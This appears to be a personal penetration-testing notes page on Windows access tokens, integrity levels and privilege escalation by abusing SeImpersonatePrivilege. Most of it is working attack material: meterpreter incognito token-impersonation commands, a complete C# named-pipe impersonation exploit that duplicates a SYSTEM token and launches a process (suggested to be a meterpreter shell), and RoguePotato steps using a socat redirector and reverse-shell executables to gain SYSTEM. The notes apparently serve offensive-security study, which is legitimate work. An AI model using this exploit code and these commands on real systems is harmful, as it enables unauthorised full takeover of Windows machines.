---
layout:     post
author:     0x5c4r3
type: docs
permalink: Access_Tokens
---


<span style="font-size: 35px; color:red"><b>Access Tokens</b></span>

https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/

An access token is created by the kernel upon user authentication and contains important values that are linked to a specific user through the SID.
We are interested in _Integrity Levels_ (Low: services like sandboxes or web browsers, Medium: Regular users, High: Administrators, System: System services) and _Privileges_.

Local administrators receive two access tokens when authenticating. The first (which is used by default) is configured to create processes as medium integrity. When a user selects the "Run as administrator" option for an application, the second elevated token is used instead, and allows the process to run at high integrity. The _User Account Control_ (UAC) mechanism links these two tokens to a single user and creates the consent prompt. A local administrator regulated by UAC is sometimes also called a split-token administrator.
To check privs:

```shell
whoami /priv
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Elevation With SeImpersonatePrivilege (PrintSpoofer)</b></span>

Other similar exploit: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
https://github.com/itm4n/PrintSpoofer <-- USE THIS ONE IF YOU CAN (run <span style="color:red">printspoofer.exe -i -c powershell</span> from a profile that has the SeImpersonationPriv on).


After receiving a meterpreter revshell, you can play with impersonation tokens using the <span style="color:red">incognito</span> module:
```shell
load incognito
help incognito
list_tokens -u
impersonate_token <domain>\\<user>
```
and run <span style="color:red">shell</span> and <span style="color:red">whoami</span> to see if it worked.


This code expects the pipe name to be passed on the command line:
```cs
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{		
    class Program
    {

		[StructLayout(LayoutKind.Sequential)]
		public struct SID_AND_ATTRIBUTES
		{
		    public IntPtr Sid;
		    public int Attributes;
		}

		public struct TOKEN_USER
		{
		    public SID_AND_ATTRIBUTES User;
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
		    public IntPtr hProcess;
		    public IntPtr hThread;
		    public int dwProcessId;
		    public int dwThreadId;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
		    public Int32 cb;
		    public string lpReserved;
		    public string lpDesktop;
		    public string lpTitle;
		    public Int32 dwX;
		    public Int32 dwY;
		    public Int32 dwXSize;
		    public Int32 dwYSize;
		    public Int32 dwXCountChars;
		    public Int32 dwYCountChars;
		    public Int32 dwFillAttribute;
		    public Int32 dwFlags;
		    public Int16 wShowWindow;
		    public Int16 cbReserved2;
			public IntPtr lpReserved2;
		    public IntPtr hStdInput;
		    public IntPtr hStdOutput;
		    public IntPtr hStdError;
		}
		[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
		public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

		
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

		[DllImport("kernel32.dll")]
		static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

		[DllImport("Advapi32.dll")]
		static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();

		[DllImport("advapi32.dll", SetLastError = true)]
		static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

		[DllImport("advapi32.dll", SetLastError = true)]
		static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

		[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
		static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

		[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

			ConnectNamedPipe(hPipe, IntPtr.Zero);
			ImpersonateNamedPipeClient(hPipe);

			IntPtr hToken;
			OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

			int TokenInfLength = 0;
			GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
			IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
			GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

			TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
			IntPtr pstr = IntPtr.Zero;
			Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
			string sidstr = Marshal.PtrToStringAuto(pstr);
			Console.WriteLine(@"Found sid {0}", sidstr);

			IntPtr hSystemToken = IntPtr.Zero;
			DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
			STARTUPINFO si = new STARTUPINFO();
			si.cb = Marshal.SizeOf(si);
			CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);

        }
    }
}
```
You can change the final <span style="color:red">C:\\Windows\\System32\\cmd.exe</span> with whatever you wanna run as high integrity (also a meterpreter shell).


To test it:
```shell
psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe
```
From the newly open cmd (leave it hanging):
```shell
PrintSpooferNet.exe \\.\pipe\test
```
And from another cmd.exe (3rd one open):
```shell
echo hello > \\localhost\pipe\test
```

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Juicy Potato + Rotten Potato = Rougue Potato</b></span>

Abusing <span style="color:red">SeImpersonatePrivilege</span>

Redirect traffic flow to 9999:
```shell
sudo socat tcp-listen:135,reuseaddr,fork tcp:<remote_ip>:9999
```

Then start an elevated prompt:
```shell
PSExec64.exe -i -u "nt authority\local service" C:\Privesc\<revshell>.exe
```
From the revshell you just spowned, run the roguepotato exploit to get a second revshell with SYSTEM privs:
```shell
RoguePotato.exe -r <ip> -e "C:\Privesc\<revshell>.exe" -l 9999
```
And you will get a revshell as System.
